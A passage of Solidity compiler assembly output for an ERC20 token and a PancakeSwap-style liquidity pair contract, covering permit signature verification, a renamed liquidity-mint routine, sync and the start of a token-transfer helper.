mstore\n      0x0122\n      dup1\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      dup1\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup6\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap7\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup7\n      mstore\n        /* \"src/ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0142\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n        /* \"src/ERC20.sol\":3751:4186  keccak256(... */\n      dup7\n      mload\n      swap7\n      dup4\n      add\n      swap7\n      swap1\n      swap7\n      keccak256\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      swap6\n      dup4\n      swap1\n      mstore\n      0x0162\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n      dup7\n      swap1\n      mstore\n      0xff\n      dup10\n      and\n      0x0182\n      dup6\n      add\n      mstore\n      0x01a2\n      dup5\n      add\n      dup9\n      swap1\n      mstore\n      0x01c2\n      dup5\n      add\n      dup8\n      swap1\n      mstore\n      mload\n        /* \"src/ERC20.sol\":3734:3748  bytes32 digest */\n      swap2\n      swap4\n        /* \"src/ERC20.sol\":4073:4088  nonces[owner]++ */\n      swap3\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      0x01e2\n      dup1\n      dup3\n      add\n      swap4\n      not(0x1f)\n      dup2\n      add\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n        /* \"src/ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup6\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_271\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_271:\n      pop\n      pop\n        /* \"src/ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      mload(add(not(0x1f), mload(0x40)))\n      swap2\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4280:4310  recoveredAddress != address(0) */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"src/ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n      tag_272\n      jumpi\n      pop\n        /* \"src/ERC20.sol\":4334:4339  owner */\n      dup9\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n        /* \"src/ERC20.sol\":4314:4330  recoveredAddress */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n      eq\n        /* \"src/ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n    tag_272:\n        /* \"src/ERC20.sol\":4259:4391  require(... */\n      tag_273\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1a\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e56414c49445f5349474e4154555245000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_273:\n        /* \"src/ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      tag_274\n        /* \"src/ERC20.sol\":4410:4415  owner */\n      dup10\n        /* \"src/ERC20.sol\":4417:4424  spender */\n      dup10\n        /* \"src/ERC20.sol\":4426:4431  value */\n      dup10\n        /* \"src/ERC20.sol\":4401:4409  _approve */\n      tag_183\n        /* \"src/ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      jump\t// in\n    tag_274:\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/Pair.sol\":6279:7560  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_120:\n        /* \"src/Pair.sol\":6332:6346  uint liquidity */\n      0x00\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_276\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_276:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/Pair.sol\":1233:1234  0 */\n      dup1\n        /* \"src/Pair.sol\":6401:6414  getReserves() */\n      tag_278\n        /* \"src/Pair.sol\":6401:6412  getReserves */\n      tag_54\n        /* \"src/Pair.sol\":6401:6414  getReserves() */\n      jump\t// in\n    tag_278:\n      pop\n        /* \"src/Pair.sol\":6462:6468  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":6488:6492  this */\n      address\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":6358:6414  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"src/Pair.sol\":6439:6452  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":6462:6468  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"src/Pair.sol\":6455:6479  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":6462:6468  token0 */\n      dup7\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_279\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_279:\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_280\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_280:\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_281\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_281:\n      pop\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":6527:6533  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":6553:6557  this */\n      address\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"src/Pair.sol\":6504:6517  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":6527:6533  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/Pair.sol\":6520:6544  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/Pair.sol\":6455:6494  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":6527:6533  token1 */\n      dup7\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_282\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_282:\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_283\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_283:\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_284\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_284:\n      pop\n        /* \"src/Pair.sol\":6520:6559  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"src/Pair.sol\":6569:6581  uint amount0 */\n      0x00\n        /* \"src/Pair.sol\":6584:6607  balance0.sub(_reserve0) */\n      tag_285\n        /* \"src/Pair.sol\":6584:6592  balance0 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":6584:6607  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":6584:6596  balance0.sub */\n      tag_170\n        /* \"src/Pair.sol\":6584:6607  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_285:\n        /* \"src/Pair.sol\":6569:6607  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":6617:6629  uint amount1 */\n      0x00\n        /* \"src/Pair.sol\":6632:6655  balance1.sub(_reserve1) */\n      tag_286\n        /* \"src/Pair.sol\":6632:6640  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":6632:6655  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":6632:6644  balance1.sub */\n      tag_170\n        /* \"src/Pair.sol\":6632:6655  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_286:\n        /* \"src/Pair.sol\":6617:6655  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":6666:6676  bool feeOn */\n      0x00\n        /* \"src/Pair.sol\":6679:6709  _mintFee(_reserve0, _reserve1) */\n      tag_287\n        /* \"src/Pair.sol\":6688:6697  _reserve0 */\n      dup8\n        /* \"src/Pair.sol\":6699:6708  _reserve1 */\n      dup8\n        /* \"src/Pair.sol\":6679:6687  _mintFee */\n      tag_204\n        /* \"src/Pair.sol\":6679:6709  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_287:\n        /* \"src/Pair.sol\":6719:6736  uint _totalSupply */\n      0x00\n        /* \"src/Pair.sol\":6739:6750  totalSupply */\n      sload\n        /* \"src/Pair.sol\":6666:6709  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/Pair.sol\":6842:6859  _totalSupply == 0 */\n      dup1\n        /* \"src/Pair.sol\":6838:7237  if (_totalSupply == 0) {... */\n      tag_288\n      jumpi\n        /* \"src/Pair.sol\":6887:6941  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_289\n        /* \"src/Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"src/Pair.sol\":6887:6918  Math.sqrt(amount0.mul(amount1)) */\n      tag_169\n        /* \"src/Pair.sol\":6897:6917  amount0.mul(amount1) */\n      tag_208\n        /* \"src/Pair.sol\":6897:6904  amount0 */\n      dup8\n        /* \"src/Pair.sol\":6909:6916  amount1 */\n      dup8\n        /* \"src/Pair.sol\":6897:6917  amount0.mul(amount1) */\n      0xffffffff\n        /* \"src/Pair.sol\":6897:6908  amount0.mul */\n      tag_168\n        /* \"src/Pair.sol\":6897:6917  amount0.mul(amount1) */\n      and\n      jump\t// in\n        /* \"src/Pair.sol\":6887:6941  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_289:\n        /* \"src/Pair.sol\":6875:6941  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"src/Pair.sol\":6955:6996  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      tag_292\n        /* \"src/Pair.sol\":6974:6975  0 */\n      0x00\n        /* \"src/Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"src/Pair.sol\":6955:6965  freezeMint */\n      tag_293\n        /* \"src/Pair.sol\":6955:6996  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_292:\n      pop\n        /* \"src/Pair.sol\":6838:7237  if (_totalSupply == 0) {... */\n      jump(tag_294)\n    tag_288:\n        /* \"src/Pair.sol\":7094:7226  Math.min(... */\n      tag_295\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":7120:7157  amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"src/Pair.sol\":7120:7145  amount0.mul(_totalSupply) */\n      tag_214\n        /* \"src/Pair.sol\":7120:7127  amount0 */\n      dup7\n        /* \"src/Pair.sol\":7132:7144  _totalSupply */\n      dup5\n        /* \"src/Pair.sol\":7120:7145  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/Pair.sol\":7120:7131  amount0.mul */\n      tag_168\n        /* \"src/Pair.sol\":7120:7145  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n        /* \"src/Pair.sol\":7094:7226  Math.min(... */\n    tag_295:\n        /* \"src/Pair.sol\":7082:7226  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"src/Pair.sol\":6838:7237  if (_totalSupply == 0) {... */\n    tag_294:\n        /* \"src/Pair.sol\":7266:7267  0 */\n      0x00\n        /* \"src/Pair.sol\":7254:7263  liquidity */\n      dup10\n        /* \"src/Pair.sol\":7254:7267  liquidity > 0 */\n      gt\n        /* \"src/Pair.sol\":7246:7312  require(liquidity > 0, \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_300\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x28\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e\n      0x28\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_300:\n        /* \"src/Pair.sol\":7322:7347  freezeMint(to, liquidity) */\n      tag_301\n        /* \"src/Pair.sol\":7333:7335  to */\n      dup11\n        /* \"src/Pair.sol\":7337:7346  liquidity */\n      dup11\n        /* \"src/Pair.sol\":7322:7332  freezeMint */\n      tag_293\n        /* \"src/Pair.sol\":7322:7347  freezeMint(to, liquidity) */\n      jump\t// in\n    tag_301:\n      pop\n        /* \"src/Pair.sol\":7358:7407  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_221\n        /* \"src/Pair.sol\":7366:7374  balance0 */\n      dup7\n        /* \"src/Pair.sol\":7376:7384  balance1 */\n      dup7\n        /* \"src/Pair.sol\":7386:7395  _reserve0 */\n      dup11\n        /* \"src/Pair.sol\":7397:7406  _reserve1 */\n      dup11\n        /* \"src/Pair.sol\":7358:7365  _update */\n      tag_179\n        /* \"src/Pair.sol\":7358:7407  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n        /* \"src/ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_123:\n      0x02\n      0x20\n      swap1\n      dup2\n      mstore\n      0x00\n      swap3\n      dup4\n      mstore\n      0x40\n      dup1\n      dup5\n      keccak256\n      swap1\n      swap2\n      mstore\n      swap1\n      dup3\n      mstore\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":641:659  uint public taxfee */\n    tag_125:\n      sload(0x0a)\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":18168:18382  function sync() external lock {... */\n    tag_127:\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_306\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_306:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      sstore\n        /* \"src/Pair.sol\":18236:18242  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":18262:18266  this */\n      address\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":18208:18375  _update(... */\n      tag_308\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":18236:18242  token0 */\n      and\n      swap2\n        /* \"src/Pair.sol\":18229:18253  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":18236:18242  token0 */\n      dup7\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_309\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_309:\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_310\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_310:\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_311\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_311:\n      pop\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":18289:18295  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":18315:18319  this */\n      address\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":18289:18295  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/Pair.sol\":18282:18306  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":18289:18295  token1 */\n      dup7\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_312\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_312:\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_313\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_313:\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_314\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_314:\n      pop\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":18335:18343  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/Pair.sol\":18357:18365  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/Pair.sol\":18208:18215  _update */\n      tag_179\n        /* \"src/Pair.sol\":18208:18375  _update(... */\n      jump\t// in\n    tag_308:\n        /* \"src/Pair.sol\":1266:1267  1 */\n      0x01\n        /* \"src/Pair.sol\":1255:1263  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1255:1267  unlocked = 1 */\n      sstore\n        /* \"src/Pair.sol\":18168:18382  function sync() external lock {... */\n      jump\t// out\n        /* \"src/Pair.sol\":1587:1925  function _safeTransfer(address token, address to, uint value) private {... */\n    tag_142:\n        /* \"src/Pair.sol\":516:550  bytes(\"transfer(address,uint256)\") */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      dup3\n      mstore\n      0x19\n      dup2\n      mstore\n      0x7472616e7366657228616464726573732c75696e743235362900000000000000\n      0x20\n      swap2\n      dup3\n      add\n      mstore\n        /* \"src/Pair.sol\":1727:1770  abi.encodeWithSelector(SELECTOR, to, value) */\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      dup2\n      and\n      0x24\n      dup4\n      add\n      mstore\n      0x44\n      dup1\n      dup4\n      add\n      dup7\n      swap1\n      mstore\n      dup5\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup5\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"src/Pair.sol\":1727:1770  abi.encodeWithSelector(SELECTOR, to, value) */\n      0x64\n      swap1\n      swap3\n      add\n      dup5\n      mstore\n        /* \"--CODEGEN--\":25:43   */\n      swap2\n      dup2\n      add\n        /* \"--CODEGEN--\":61:78   */\n      dup1\n      mload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"--CODEGEN--\":182:197   */\n      and\n      shl(0xe0, 0xa9059cbb)\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":160:209   */\n      dup2\n      mstore\n        /* \"src/Pair.sol\":1703:1780  token.call(... */\n      swap3\n      mload\n      dup2\n      mload\n        /* \"src/Pair.sol\":1668:1680  bool success */\n      0x00\n      swap5\n        /* \"src/Pair.sol\":1682:1699  bytes memory data */\n      0x60\n      swap5\n        /* \"src/Pair.sol\":1703:1713  token.call */\n      dup10\n      and\n      swap4\n        /* \"src/Pair.sol\":1727:1770  abi.encodeWithSelector(SELECTOR, to, 